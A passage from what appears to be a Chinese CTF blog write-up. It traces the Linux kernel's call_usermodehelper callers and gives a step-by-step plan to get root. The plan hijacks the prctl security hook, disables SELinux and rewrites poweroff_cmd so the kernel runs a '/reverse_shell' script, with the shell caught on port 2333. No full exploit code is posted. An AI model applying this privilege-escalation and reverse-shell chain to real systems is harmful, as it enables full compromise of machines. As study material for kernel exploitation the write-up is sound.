<h2 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h2><p>在slide中提到一个call_usermodehelper函数，该函数可以实现在内核空间调用用户空间的应用程序，该函数会注册一个subprocess_info-&gt;work handler，然后调用call_usermodehelper_setup和call_usermodehelper_exec函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/umh.c#L478</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">					 <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>call_usermodehelper_setup函数用来设置路径，函数参数，环境变量以及执行work handler。call_usermodehelper_exec函数会向system_unbound_wq队列注册一个sub_info-&gt;work。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/umh.c#L367</span></span><br><span class="line"><span class="function">struct subprocess_info *<span class="title">call_usermodehelper_setup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">char</span> **envp, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line">		int (*init)(struct subprocess_info *info, struct cred *new),</span><br><span class="line">		<span class="keyword">void</span> (*cleanup)(struct subprocess_info *info),</span><br><span class="line">		<span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line">	INIT_WORK(&amp;sub_info-&gt;work, call_usermodehelper_exec_work);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">	sub_info-&gt;path = CONFIG_STATIC_USERMODEHELPER_PATH;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	sub_info-&gt;path = path;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	sub_info-&gt;argv = argv;</span><br><span class="line">	sub_info-&gt;envp = envp;</span><br><span class="line"></span><br><span class="line">	sub_info-&gt;cleanup = cleanup;</span><br><span class="line">	sub_info-&gt;init = init;</span><br><span class="line">	sub_info-&gt;data = data;</span><br><span class="line">  out:</span><br><span class="line">	<span class="keyword">return</span> sub_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/umh.c#L408</span></span><br><span class="line"><span class="function">nt <span class="title">call_usermodehelper_exec</span><span class="params">(struct subprocess_info *sub_info, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DECLARE_COMPLETION_ONSTACK(done);</span><br><span class="line">	<span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line">	queue_work(system_unbound_wq, &amp;sub_info-&gt;work);</span><br><span class="line">	<span class="keyword">if</span> (wait == UMH_NO_WAIT)	<span class="comment">/* task has freed sub_info */</span></span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (wait &amp; UMH_KILLABLE) &#123;</span><br><span class="line">		retval = wait_for_completion_killable(&amp;done);</span><br><span class="line">		<span class="keyword">if</span> (!retval)</span><br><span class="line">			<span class="keyword">goto</span> wait_done;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* umh_complete() will see NULL and free sub_info */</span></span><br><span class="line">		<span class="keyword">if</span> (xchg(&amp;sub_info-&gt;complete, <span class="literal">NULL</span>))</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">		<span class="comment">/* fallthrough, umh_complete() was already called */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为call_usermodehelper具有root权限，如果我们可以利用题目限制的任意读写来调用该函数，就可以以root权限执行需要执行的程序。但是利用上文中提到的将task_prctl修改为call_usermodehelper也是不可以的，因为它作为第一个参数也是64位，会发生截断。另外的思路就是找一下其他调用了call_usermodehelper函数的其他函数。<br>为了查看偏移以及后面一些函数的交叉引用，通过extract-vmlinux提取出的vmlinux没有符号表，需要自己编译一个内核，这里我选择的内核版本是4.15.8，下载4.15.8的<a href="https://mirror.bjtu.edu.cn/kernel/linux/kernel/v4.x/" target="_blank" rel="noopener">内核源码</a>，进行编译。依次执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make all</span><br><span class="line">make modules</span><br></pre></td></tr></table></figure></p>
<p>在内核根目录下生成了vmlinux，在IDA里打开，就可以查看各个函数以及调用情况。因为我们不看偏移，只追溯函数调用，所以版本其实没有很大的影响。<br>在IDA里可以看到该函数的交叉引用一共有三个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Down	p	run_cmd+30	call    near ptr call_usermodehelper-0B295h</span><br><span class="line">Down	p	cgroup1_release_agent+111	call    call_usermodehelper-87416h</span><br><span class="line">Down	p	tomoyo_load_policy+C3	call    near ptr call_usermodehelper-2F3598h</span><br></pre></td></tr></table></figure></p>
<p>好像和版本还是有关联的，因为p4nda的文章里写的交叉引用有4个，少的是mce_do_trigger，我在我编译的vmlinux里都搜索不到这个函数。<br>如果调用cgroup1_release_agent这个函数，需要伪造一个work_struct结构体。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/cgroup/cgroup-v1.c#L814</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cgroup1_release_agent</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cgroup</span> *<span class="title">cgrp</span> =</span></span><br><span class="line"><span class="class">		<span class="title">container_of</span>(<span class="title">work</span>, <span class="title">struct</span> <span class="title">cgroup</span>, <span class="title">release_agent_work</span>);</span></span><br><span class="line">	<span class="keyword">char</span> *pathbuf = <span class="literal">NULL</span>, *agentbuf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> *argv[<span class="number">3</span>], *envp[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line">	argv[<span class="number">0</span>] = agentbuf;</span><br><span class="line">	argv[<span class="number">1</span>] = pathbuf;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* minimal command environment */</span></span><br><span class="line">	envp[<span class="number">0</span>] = <span class="string">"HOME=/"</span>;</span><br><span class="line">	envp[<span class="number">1</span>] = <span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>;</span><br><span class="line">	envp[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	mutex_unlock(&amp;cgroup_mutex);</span><br><span class="line">	call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>虽然tomoyo_load_policy函数只有一个filename的参数，但是前面有strcmp的检查，有一些限制。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/security/tomoyo/load_policy.c#L84</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tomoyo_load_policy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">bool</span> done;</span><br><span class="line">	<span class="keyword">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">char</span> *envp[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tomoyo_policy_loaded || done)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (!tomoyo_trigger)</span><br><span class="line">		tomoyo_trigger = CONFIG_SECURITY_TOMOYO_ACTIVATION_TRIGGER;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(filename, tomoyo_trigger))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (!tomoyo_policy_loader_exists())</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	done = <span class="literal">true</span>;</span><br><span class="line">	printk(KERN_INFO <span class="string">"Calling %s to load policy. Please wait.\n"</span>,</span><br><span class="line">	       tomoyo_loader);</span><br><span class="line">	argv[<span class="number">0</span>] = (<span class="keyword">char</span> *) tomoyo_loader;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	envp[<span class="number">0</span>] = <span class="string">"HOME=/"</span>;</span><br><span class="line">	envp[<span class="number">1</span>] = <span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>;</span><br><span class="line">	envp[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">	tomoyo_check_profile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>还有一个run_cmd函数，该函数根据传入的命令做参数的切分，然后调用call_usermodehelper执行传入的命令。参数比较简单，在向上回溯run_cmd的调用者。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> **argv;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">"HOME=/"</span>,</span><br><span class="line">		<span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (argv) &#123;</span><br><span class="line">		ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">		argv_free(argv);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>查看run_cmd的交叉引用发现有两个调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Down	p	reboot_work_func+C	call    run_cmd</span><br><span class="line">Down	p	poweroff_work_func+14	call    run_cmd</span><br></pre></td></tr></table></figure></p>
<p>函数reboot_work_func调用了__orderly_reboot函数，该函数调用了run_cmd函数。但是该函数的参数work位于.rodata段，在IDA里可以看到。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/reboot.c#L499</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reboot_work_func</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__orderly_reboot();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/reboot.c#L439</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_reboot(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(reboot_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">		pr_warn(<span class="string">"Failed to start orderly reboot: forcing the issue\n"</span>);</span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_restart(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//IDA reboot_work_func</span></span><br><span class="line">.text:FFFFFFFF8109B9E0 reboot_work_func proc near</span><br><span class="line">.text:FFFFFFFF8109B9E0 work = rdi                              ; work_struct *</span><br><span class="line">.text:FFFFFFFF8109B9E0                 call    near ptr __fentry__+<span class="number">9666</span>ABh</span><br><span class="line">.text:FFFFFFFF8109B9E5                 mov     work, (offset __start_rodata+<span class="number">81E311</span>C0h) ;</span><br></pre></td></tr></table></figure></p>
<p>第二个函数poweroff_work_func调用了__orderly_poweroff，然后该函数调用了run_cmd。这个work的参数在.data段上。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/reboot.c#L477</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">poweroff_work_func</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__orderly_poweroff(poweroff_force);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/reboot.c#L454</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">		pr_warn(<span class="string">"Failed to start orderly shutdown: forcing the issue\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment">		 * poweroff asap.  Or not even bother syncing if we're doing an</span></span><br><span class="line"><span class="comment">		 * emergency shutdown?</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_power_off();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//IDA</span></span><br><span class="line">.text:FFFFFFFF8109BD00 poweroff_work_func proc near</span><br><span class="line">.text:FFFFFFFF8109BD00 work = rdi                              ; work_struct *</span><br><span class="line">.text:FFFFFFFF8109BD00                 call    near ptr __fentry__+<span class="number">96638B</span>h</span><br><span class="line">.text:FFFFFFFF8109BD05                 push    rbx</span><br><span class="line">.text:FFFFFFFF8109BD06                 mov     work, (offset poweroff_cmd+<span class="number">82250</span>CE0h)</span><br><span class="line">.text:FFFFFFFF8109BD0D                 movzx   ebx, byte ptr cs:unk_FFFFFFFF829A2FFF+<span class="number">1741</span>A2Dh</span><br><span class="line">.text:FFFFFFFF8109BD14                 call    run_cmd</span><br></pre></td></tr></table></figure></p>
<p>因此我们的目标就是将prctl-&gt;hook.task_prctl修改为poweroff_work_func函数。<br>总结一下利用思路：</p>
<ol>
<li>利用kremalloc的漏洞获得任意内存读写能力。</li>
<li>利用vdso爆破得到vdso的地址，可以利用vdso中的字符串”__vdso_gettimeofday”，然后泄露内核基址。</li>
<li>将prctl-&gt;hook.task_prctl修改为selinux_disable，调用prctl函数，从而关闭selinux。（但这一步好像只有在android中会用到，用来关闭SEAndroid）。</li>
<li>将在poweroff_work_func函数中调用的run_cmd函数的参数(位于.data段中）修改为”/reverse_shell\0”。</li>
<li>将prctl-&gt;hook.task_prctl修改为poweroff_work_func函数。调用prctl函数，触发反弹shell的脚本reverse_shell。</li>
<li>fork一个子进程用来监听2333端口，拿到shell。</li>
</ol>
<h2 id="函数偏移"><a href="#函数偏移" class="headerlink" title="函数偏移"></a>函数偏移</h2><p>这里记录仪一下我找函数偏移的过程，首先需要prctl-&gt;hook.task_prctl函数的偏移，修改init，修改权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure></p>
<p>然后查看调用prctl函数，查看security_task_prctl函数地址，在gdb中下断点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep security_task_prctl /proc/kallsyms</span><br><span class="line">ffffffffaa0bd410 T security_task_prctl</span><br></pre></td></tr></table></figure></p>
<p>在IDA里可以看到，在security_task_prctl+0x4d处有一个非直接调用，这个调用是jmp rax，那么rax就是我们要找的prctl-&gt;hook.task_prctl，hp是rbx，那么rbx+0x18就是我们要覆写的虚表地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81352B35                 mov     rbx, cs:security_hook_heads_0.binder_set_context_mgr.next+1619D44h</span><br><span class="line">.text:FFFFFFFF81352B3C hp = rbx                                ; security_hook_list *</span><br><span class="line">.text:FFFFFFFF81352B3C                 mov     [rsp+38h+var_38], arg5</span><br><span class="line">.text:FFFFFFFF81352B40                 cmp     hp, (offset security_hook_heads_0.task_prctl+8296C190h)</span><br><span class="line">.text:FFFFFFFF81352B47                 jz      short loc_FFFFFFFF81352B7A</span><br><span class="line">.text:FFFFFFFF81352B49</span><br><span class="line">.text:FFFFFFFF81352B49 loc_FFFFFFFF81352B49:                   ; CODE XREF: security_task_prctl+68↓j</span><br><span class="line">.text:FFFFFFFF81352B49                 mov     rax, [hp+18h]  //here</span><br><span class="line">.text:FFFFFFFF81352B4D                 mov     arg5, [rsp+38h+var_38]</span><br><span class="line">.text:FFFFFFFF81352B51                 mov     arg4, rbp</span><br><span class="line">.text:FFFFFFFF81352B54                 mov     arg3, r12</span><br><span class="line">.text:FFFFFFFF81352B57                 mov     arg2, r13</span><br><span class="line">.text:FFFFFFFF81352B5A                 mov     edi, r14d</span><br><span class="line">.text:FFFFFFFF81352B5D                 call    near ptr __indirect_thunk_start+8B049Eh</span><br></pre></td></tr></table></figure></p>
<p>在gdb里执行到security_task_prctl+0x25处看一下rbx的值，减去kernel base，kernel base可以利用vdso算出来，然后得到偏移：<br><img src="/2019/10/10/ret2dir利用学习/7.png" alt="7"><br>selinux_disable函数地址直接可以查看/proc/kallsyms得到，同理可以得到poweroff_work_func函数地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep selinux_disable /proc/kallsyms</span><br><span class="line">ffffffffaa0c7ba0 T selinux_disable</span><br><span class="line">grep selinux_disable /proc/kallsyms</span><br><span class="line">ffffffffaa0c7ba0 T selinux_disable</span><br></pre></td></tr></table></figure></p>
<p>在poweroff_work_func函数下断点，因为我们已经知道prctl-&gt;hook.task_prctl的地址了，可以在exp里先将prctl-&gt;hook.task_prctl修改为poweroff_work_func函数地址，然后下断点，在gdb里得到它的参数的地址。<br><img src="/2019/10/10/ret2dir利用学习/8.png" alt="8"><br>这样所需的偏移就都能得到了。</p>
<p>还有一个问题就是前面不是说64位参数会有截断的问题，但是为什么还是可以传递参数呢，整个利用过程中我们都没有利用prctl的参数，首先我们将prctl-&gt;hook.task_prctl函数虚表地址修改位selinux_disable，然后调用prctl函数，因为selinux_disable函数没有参数，所以调用没有什么问题，即使参数截断也没有问题。第二次我们将run_cmd位于data段的参数修改为”/reverse_shell”，将prctl-&gt;hook.task_prctl修改为poweroff_work_func函数，当调用prctl时，函数调用链就变为 prctl -&gt; security_task_prctl -&gt; hp-&gt;hook.task_prctl -&gt; poweroff_work_func -&gt; __orderly_poweroff -&gt; run_cmd -&gt; 执行”/reverse_shell”命令。中间不涉及到参数传递的问题。回顾我们之前设想的利用，是将hp-&gt;hook.task_prctl修改为commit_creds，然后传递cred_addr，cred_addr是64位地址，就会有截断的问题。</p>
<p>exp就不贴了，都是参照大佬的exp调的，仅仅记录我的学习过程和遇到的问题，其实还有一个问题，怎么确定内核基址，之前我一直以为lsmod是内核基址，今天突然想明白它是模块加载的基址，之所以在vmlinux调试时加上这个地址，是因为需要加载模块的符号表，怎么就忘了vmlinux是未压缩的内核了呢。关于确定内核基址的问题再去问问大佬或者自己再研究研究。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h2><p><a href="https://cloud.tencent.com/developer/article/1073909" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1073909</a><br><a href="http://man7.org/linux/man-pages/man7/vdso.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/vdso.7.html</a><br><a href="https://blog.csdn.net/wlp600/article/details/6886162" target="_blank" rel="noopener">https://blog.csdn.net/wlp600/article/details/6886162</a><br><a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-3.html" target="_blank" rel="noopener">https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-3.html</a></p>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><p><a href="https://www.anquanke.com/post/id/185408" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185408</a><br><a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xJDchen/p/6143102.html</a><br><a href="https://xz.aliyun.com/t/3204" target="_blank" rel="noopener">https://xz.aliyun.com/t/3204</a><br><a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</a></p>
<h2 id="prctl-1"><a href="#prctl-1" class="headerlink" title="prctl"></a>prctl</h2><p><a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225488.htm</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/04/KCTF-Q3-PWN/" rel="next" title="KCTF Q3 PWN">
                <i class="fa fa-chevron-left"></i> KCTF Q3 PWN
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/10/24/hackme/" rel="prev" title="starctf 2019 hackme">
                starctf 2019 hackme <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

